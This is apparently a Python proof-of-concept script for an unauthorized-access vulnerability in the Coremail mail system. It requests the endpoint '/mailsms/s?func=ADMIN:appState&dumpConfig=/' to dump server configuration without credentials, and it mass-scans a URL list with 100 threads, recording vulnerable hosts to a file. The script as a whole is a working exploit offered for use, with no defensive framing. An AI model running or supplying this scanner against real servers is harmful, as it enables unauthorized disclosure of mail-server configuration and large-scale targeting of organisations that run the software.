# coremail 邮件系统未授权访问\漏洞
import requests,json,sys,argparse
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
 ██████╗ ██████╗ ██████╗ ███████╗███╗   ███╗ █████╗ ██╗██╗     
██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗ ████║██╔══██╗██║██║     
██║     ██║   ██║██████╔╝█████╗  ██╔████╔██║███████║██║██║     
██║     ██║   ██║██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     
╚██████╗╚██████╔╝██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██║███████╗
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝

                                    author:阿迪

"""
    colored_color = colored(test, 'blue')
    print(colored_color)

def main():
    banner()
    parser = argparse.ArgumentParser(description='coremail 邮件系统未授权访问\漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    api_payload = '/mailsms/s?func=ADMIN:appState&dumpConfig=/'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Connection':'close',
    }
    try:
        response = requests.get(url=target+api_payload,headers=headers,verify=False,timeout=10)
        if response.status_code == 200 and 'name=' in response.text:
            print(f'[+]{target} 存在未授权访问漏洞')
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f'[-]{target} 不存在未授权访问漏洞')
    except:
        print(f'{target} 该站点无法访问')

if __name__ == '__main__':
    main()